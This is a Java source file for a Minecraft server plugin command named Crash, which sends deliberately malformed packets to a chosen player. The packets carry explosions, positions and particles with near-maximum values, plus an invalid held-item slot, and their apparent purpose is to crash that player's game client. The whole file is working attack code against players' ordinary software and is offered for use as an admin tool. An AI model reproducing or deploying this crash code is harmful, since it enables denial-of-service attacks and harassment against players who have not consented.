package cn.ChengZhiYa.MHDFTools.command.feature;

import cn.ChengZhiYa.MHDFTools.command.AbstractCommand;
import cn.ChengZhiYa.MHDFTools.manager.init.PluginHookManager;
import cn.ChengZhiYa.MHDFTools.util.BungeeCordUtil;
import cn.ChengZhiYa.MHDFTools.util.config.ConfigUtil;
import cn.ChengZhiYa.MHDFTools.util.config.LangUtil;
import com.github.retrooper.packetevents.protocol.particle.Particle;
import com.github.retrooper.packetevents.protocol.particle.type.ParticleTypes;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.*;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

@SuppressWarnings("unused")
public final class Crash extends AbstractCommand {
    public Crash() {
        super(
                "crashSettings.enable",
                "崩溃玩家客户端",
                "mhdftools.commands.crash",
                false,
                ConfigUtil.getConfig().getStringList("crashSettings.commands").toArray(new String[0])
        );
    }

    @Override
    public void execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
        if (args.length >= 1) {
            Player player = Bukkit.getPlayer(args[0]);
            if (player == null) {
                sender.sendMessage(LangUtil.i18n("playerOffline"));
                return;
            }

            String crashType = args.length == 1
                    ? ConfigUtil.getConfig().getString("crashSettings.defaultType")
                    : args[1];

            if (crashType != null && crashPlayerClient(player, crashType)) {
                sender.sendMessage(LangUtil.i18n("commands.crash.done"));
            } else {
                sender.sendMessage(LangUtil.i18n("commands.crash.typeNotExists"));
            }
            return;
        }

        sender.sendMessage(LangUtil.i18n("usageError")
                .replace("{usage}", LangUtil.i18n("commands.crash.usage")));
    }

    @Override
    public List<String> tabCompleter(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
        if (args.length == 1) {
            return BungeeCordUtil.getPlayerList();
        }
        if (args.length == 2) {
            return Arrays.asList("explosion", "changeHoldItem", "posAndLook", "invalidParticle");
        }
        return new ArrayList<>();
    }

    private boolean crashPlayerClient(Player player, String crashType) {
        switch (crashType.toLowerCase()) {
            case "explosion" -> {
                PluginHookManager.getPacketEventsHook().sendPacket(player,
                        new WrapperPlayServerExplosion(
                                new Vector3d(generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition()),
                                generateInvalidLook(),
                                Collections.emptyList(),
                                new Vector3f(generateInvalidLook(), generateInvalidLook(), generateInvalidLook())
                        )
                );
                PluginHookManager.getPacketEventsHook().sendPacket(player,
                        new WrapperPlayServerWindowConfirmation(
                                Float.MAX_EXPONENT,
                                Short.MAX_VALUE,
                                false)
                );
                return true;
            }
            case "changeHoldItem" -> {
                PluginHookManager.getPacketEventsHook().sendPacket(player,
                        new WrapperPlayServerHeldItemChange(-1)
                );
                return true;
            }
            case "posAndLook" -> {
                PluginHookManager.getPacketEventsHook().sendPacket(player,
                        new WrapperPlayServerPlayerPositionAndLook(
                                generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition(),
                                generateInvalidLook(), generateInvalidLook(),
                                generateFlags(), generateTeleportID(), false
                        )
                );
                return true;
            }
            case "invalidParticle" -> {
                PluginHookManager.getPacketEventsHook().sendPacket(player,
                        new WrapperPlayServerParticle(
                                new Particle(ParticleTypes.DRAGON_BREATH), true,
                                new Vector3d(generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition()),
                                new Vector3f(generateInvalidLook(), generateInvalidLook(), generateInvalidLook()),
                                generateInvalidLook(), generateTeleportID()
                        )
                );
                return true;
            }
            default -> {
                return false;
            }
        }
    }

    private double generateInvalidPosition() {
        double baseValue = Double.MAX_VALUE;
        double randomFactor = Math.random();
        return baseValue * (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5);
    }

    private float generateInvalidLook() {
        float baseValue = Float.MAX_VALUE;
        double randomFactor = Math.random();
        return baseValue * (float)(randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5);
    }

    private Vector3f generateInvalidLookVector() {
        float invalidLook = generateInvalidLook();
        return new Vector3f(invalidLook, invalidLook, invalidLook);
    }

    private byte generateFlags() {
        int maxValue = 127;
        double randomFactor = Math.random();
        return (byte)(maxValue * (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5));
    }

    private int generateTeleportID() {
        int maxValue = Integer.MAX_VALUE;
        double randomFactor = Math.random();
        return (int)(maxValue * (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5));
    }
}
